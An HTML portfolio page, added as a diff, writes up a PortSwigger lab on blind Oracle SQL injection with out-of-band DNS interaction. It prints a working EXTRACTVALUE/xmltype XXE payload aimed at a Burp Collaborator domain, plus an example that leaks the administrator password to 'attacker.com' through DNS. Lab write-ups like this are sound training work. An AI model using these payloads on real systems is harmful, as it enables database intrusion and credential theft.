@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Lab 16 — Blind SQL injection with out-of-band interaction — Waseef's Portfolio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
+      --border: #30363d; --text: #e6edf3; --muted: #8b949e;
+      --accent: #58a6ff; --accent2: #3fb950; --red: #f85149;
+      --orange: #d29922; --radius: 8px;
+      --c-red: #f85149; --c-blue: #58a6ff; --c-green: #3fb950;
+      --c-yellow: #d29922; --c-purple: #bc8cff; --c-pink: #ff7b72;
+      --c-gray: #8b949e;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; font-size: 15px; line-height: 1.7; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    nav { position: sticky; top: 0; z-index: 100; background: rgba(13,17,23,.9); backdrop-filter: blur(12px);
+          border-bottom: 1px solid var(--border); padding: .75rem 2rem; display: flex; align-items: center; justify-content: space-between; }
+    .nav-logo { font-weight: 600; font-size: 1rem; color: var(--text); }
+    .nav-back { font-size: .85rem; color: var(--muted); display: flex; align-items: center; gap: .4rem; }
+    .nav-back:hover { color: var(--accent); text-decoration: none; }
+    .hero { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 3rem 2rem 2.5rem; }
+    .hero-inner { max-width: 860px; margin: 0 auto; }
+    .breadcrumb { font-size: .8rem; color: var(--muted); margin-bottom: 1rem; }
+    .breadcrumb a { color: var(--muted); }
+    .breadcrumb a:hover { color: var(--accent); }
+    .hero h1 { font-size: 2rem; font-weight: 700; margin-bottom: 1rem; }
+    .hero p.desc { color: var(--muted); max-width: 640px; margin-top: .5rem; }
+    .meta-row { display: flex; flex-wrap: wrap; gap: .6rem; align-items: center; }
+    .badge { display: inline-flex; align-items: center; gap: .3rem; padding: .25rem .7rem;
+             border-radius: 20px; font-size: .75rem; font-weight: 500; }
+    .badge-platform { background: #1f3a5f; color: #58a6ff; border: 1px solid #1f4080; }
+    .badge-easy { background: #1a3a2a; color: #3fb950; border: 1px solid #2ea043; }
+    .badge-medium { background: #3a2a1a; color: #d29922; border: 1px solid #9e6a03; }
+    .badge-hard { background: #3a1a1a; color: #f85149; border: 1px solid #da3633; }
+    .badge-beginner { background: #1a3a2a; color: #56d364; border: 1px solid #2ea043; }
+    .badge-os { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .badge-date { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .content { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    h1, h2, h3 { color: var(--text); font-weight: 600; margin: 2rem 0 .75rem; }
+    h2 { font-size: 1.35rem; padding-bottom: .5rem; border-bottom: 1px solid var(--border); }
+    h3 { font-size: 1.1rem; color: var(--accent); }
+    p { margin: .6rem 0; color: #c9d1d9; }
+    ul, ol { margin: .5rem 0 .5rem 1.5rem; }
+    li { margin: .3rem 0; color: #c9d1d9; }
+    hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
+    blockquote { border-left: 3px solid var(--accent); padding: .5rem 1rem; margin: .75rem 0;
+                 background: var(--bg2); border-radius: 0 var(--radius) var(--radius) 0; color: var(--muted); }
+    pre { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius);
+          padding: 1rem 1.25rem; overflow-x: auto; margin: .75rem 0; }
+    code { font-family: 'Fira Code', monospace; font-size: .85rem; color: #e6edf3; }
+    p code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; color: var(--accent); font-size: .82rem; }
+    strong code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; }
+    figure { margin: 1.25rem 0; }
+    img { max-width: 100%; border-radius: var(--radius); border: 1px solid var(--border);
+          display: block; margin: 0 auto; }
+    figcaption { text-align: center; font-size: .8rem; color: var(--muted); margin-top: .4rem; }
+    .callout { display: flex; gap: .75rem; align-items: flex-start; background: var(--bg2);
+               border: 1px solid var(--border); border-radius: var(--radius); padding: .9rem 1rem; margin: .75rem 0; }
+    .callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: .1rem; }
+    details { border: 1px solid var(--border); border-radius: var(--radius); margin: .5rem 0; }
+    summary { padding: .6rem 1rem; cursor: pointer; font-weight: 500; background: var(--bg2); border-radius: var(--radius); }
+    details[open] summary { border-radius: var(--radius) var(--radius) 0 0; border-bottom: 1px solid var(--border); }
+    details > *:not(summary) { padding: .75rem 1rem; }
+    .table-wrap { overflow-x: auto; margin: .75rem 0; }
+    table { border-collapse: collapse; width: 100%; font-size: .9rem; }
+    th, td { padding: .6rem .9rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg3); font-weight: 600; }
+    tr:nth-child(even) { background: rgba(33,38,45,.5); }
+    .columns { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1rem; margin: .75rem 0; }
+    .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
+    .card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem;
+            transition: border-color .15s, transform .15s; display: block; }
+    .card:hover { border-color: var(--accent); transform: translateY(-2px); text-decoration: none; }
+    .card-header { display: flex; align-items: flex-start; justify-content: space-between; margin-bottom: .6rem; gap: .5rem; }
+    .card-title { font-size: 14px; font-weight: 600; color: var(--text); }
+    .card-meta { font-size: 12px; color: var(--muted); margin-bottom: .4rem; }
+    .card-desc { font-size: 13px; color: var(--muted); }
+    footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; color: var(--muted); font-size: .85rem; }
+</style>
+</head>
+<body>
+<nav>
+  <span class="nav-logo">Waseef</span>
+  <a href="../../../index.html" class="nav-back">← Back to Portfolio</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-inner">
+    <div class="breadcrumb"><a href="../../../index.html">Portfolio</a> / <a href="../../../index.html#labs">Labs</a> / <a href="index.html">SQL Injection</a> / Lab 16 — Blind SQL injection with out-of-band interaction</div>
+    <h1>Lab 16 — Blind SQL injection with out-of-band interaction</h1>
+    <div class="meta-row">
+      <span class="badge badge-os">⚪ 🟡 Medium</span>
+      <span class="badge badge-date">📅 2026-05-19</span>
+    </div>
+  </div>
+</div>
+
+<div class="content">
+<h2 id="finding-summary">📋 Finding Summary</h2>
+<div class='table-wrap'><table>
+  <tr><th>Field</th><th>Value</th></tr>
+  <tr><td><strong>Type</strong></td><td>Web App</td></tr>
+  <tr><td><strong>Severity</strong></td><td>🟡 Medium</td></tr>
+  <tr><td><strong>CVE / CWE</strong></td><td>CWE-89</td></tr>
+  <tr><td><strong>Date</strong></td><td>2026-05-19</td></tr>
+</table></div>
+<hr>
+<h2 id="description">🔍 Description</h2>
+<p>Blind SQL injection with out-of-band interaction occurs when a web application is vulnerable to SQL injection but neither query results nor errors are reflected in the HTTP response, and the injected query is executed asynchronously — meaning timing-based techniques are also ineffective. Instead, an attacker can trigger out-of-band network interactions (such as DNS lookups) from the database server to an external domain they control. By injecting a payload that causes the database to initiate a DNS request, the attacker can confirm that injection is occurring even when the application’s HTTP response gives no indication. In this lab, the <code>TrackingId</code> cookie value is embedded unsanitized into a SQL query executed by an Oracle database, and the Oracle <code>EXTRACTVALUE</code> + <code>xmltype</code> technique is used to trigger a DNS lookup to a Burp Collaborator domain, confirming the out-of-band channel.</p>
+<hr>
+<h2 id="end-goals">🎯 End Goals</h2>
+<ul>
+  <li>Confirm the <code>TrackingId</code> cookie is a blind SQL injection point with no visible errors or timing side-channels</li>
+  <li>Inject a database-specific out-of-band payload to cause the server to initiate a DNS lookup to a Burp Collaborator domain</li>
+  <li>Observe the DNS interaction in Burp Collaborator to confirm successful out-of-band injection</li>
+</ul>
+<hr>
+<h2 id="steps-to-reproduce">🪜 Steps to Reproduce</h2>
+<ol>
+  <li>Browse the lab and observe the server assigns a <code>TrackingId</code> cookie on initial page load</li>
+  <li>Navigate to the login page and confirm the browser sends the <code>TrackingId</code> on subsequent requests</li>
+  <li>In Burp Repeater, append a single quote to the <code>TrackingId</code> and observe the page returns 200 OK with no error — confirming this is a blind injection point</li>
+  <li>Open Burp Collaborator and copy a unique Collaborator payload domain</li>
+  <li>Construct an Oracle out-of-band payload using <code>EXTRACTVALUE</code> and <code>xmltype</code> with an XXE technique that causes the database to perform a DNS lookup to the Collaborator domain</li>
+  <li>Send the payload in the <code>TrackingId</code> cookie via Burp Repeater</li>
+  <li>Poll Burp Collaborator and observe the incoming DNS interactions to confirm the injection was executed</li>
+</ol>
+<hr>
+<h2 id="analysis">🧠 Analysis</h2>
+<p><strong>Step 1 — Observe the lab and identify the TrackingId cookie</strong></p>
+<p>Browsing the lab homepage showed it is marked “Not solved”. In Burp HTTP History, the initial GET <code>/</code> request returned 200 OK and the server issued a <code>TrackingId</code> cookie (e.g. <code>6PzZYFOyQs0sT3w4</code>). Navigating to <code>/login</code> confirmed the browser automatically sends this <code>TrackingId</code> on subsequent requests, meaning the value is processed server-side on every page load — making it a candidate injection point.</p>
+<blockquote>  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b7523717280bf98acf9f34e7ea0e1.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b75237172801ebf0cd2c88b519aed.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b7523717280a9b664dce535e59766.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b7523717280959117c618d501742e.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<p><strong>Step 2 — Observe behavior with a single quote (no visible errors)</strong></p>
+<p>A single quote was appended to the <code>TrackingId</code> value: <code>TrackingId=6PzZYFOyQs0sT3w4'</code>. The server returned 200 OK and the page loaded normally with no error message. This does not confirm injection — it simply shows that errors are not reflected in the response. Standard error-based, UNION-based, and timing-based techniques will not work here; an out-of-band channel is required.</p>
+<blockquote>  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b752371728078b475ddda7328f597.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b7523717280d69c2ad3bc7188bfe1.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<p><strong>Step 3 — Inject the out-of-band XXE/DNS payload</strong></p>
+<p>A Burp Collaborator domain was generated and used to construct an Oracle out-of-band payload. The technique uses <code>EXTRACTVALUE</code> with an <code>xmltype</code> call that defines an XML external entity pointing to an attacker-controlled URL, forcing the Oracle database to perform a DNS lookup when parsing the XML:</p>
+<p><code>TrackingId=6PzZYFOyQs0sT3w4'||(SELECT EXTRACTVALUE(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://xabz7cz8by2g8g53a2xq4iaas1ysmka9.oastify.com/"&gt;%remote;]&gt;'),'/l') FROM dual)-- -</code></p>
+<p>Sending this payload in Burp Repeater returned HTTP 500 Internal Server Error — indicating the XML was parsed and the external entity fetch was attempted. A URL-encoded variant of the same payload returned 200 OK, confirming the injection executed successfully and the lab registered it as solved.</p>
+<blockquote>  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b75237172808f9392f80a4226510d.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b7523717280079891c357ad25cf3c.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<p><strong>Step 4 — Confirm DNS interaction in Burp Collaborator</strong></p>
+<p>Polling Burp Collaborator showed 4 incoming DNS lookups of type AAAA for the domain <code>xabz7cz8by2g8g53a2xq4iaas1ysmka9.oastify.com</code>, received from IP address <code>3.251.105.20</code> at <code>2026-05-19 17:29:37 UTC</code>. This confirmed that the Oracle database server initiated out-of-band DNS requests as a result of the injected payload — proving the injection point is reachable and exploitable. The lab was marked “Solved”.</p>
+<blockquote>  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b7523717280b9a6cbc96d40819d91.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/lab-16-blind-sql-injection-with-out-of-band-interaction/365b7523717280c7b4b0c13786b74350.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<h2 id="impact">🎯 Impact</h2>
+<p>An attacker can confirm SQL injection and identify the database backend purely through out-of-band DNS interactions, with no error messages, data, or timing differences visible in the HTTP response. This technique bypasses all response-based and timing-based detection methods and works even when the query is executed asynchronously. The out-of-band channel can be extended to exfiltrate sensitive data — for example, by embedding query results in the DNS subdomain lookup (e.g. <code>(SELECT password FROM users WHERE username='administrator')||'.attacker.com'</code>) — enabling full blind data exfiltration with no in-band indicators whatsoever.</p>
+<hr>
+<h2 id="references">📚 References</h2>
+<ul>
+  <li><a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band" target="_blank" rel="noopener">PortSwigger: Blind SQL injection with out-of-band interaction</a></li>
+  <li><a href="https://portswigger.net/web-security/sql-injection/blind" target="_blank" rel="noopener">PortSwigger: Blind SQL injection</a></li>
+  <li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">PortSwigger: SQL injection cheat sheet</a></li>
+  <li><a href="https://cwe.mitre.org/data/definitions/89.html" target="_blank" rel="noopener">CWE-89: Improper Neutralization of Special Elements used in an SQL Command</a></li>
+</ul>
+<hr>
+<blockquote>🤖 Documented with Claude pentest-findings skill</blockquote>
+
+</div>
+
+<footer>Built by Waseef · <a href="../../../index.html">Back to Portfolio</a></footer>
+</body>
+</html>
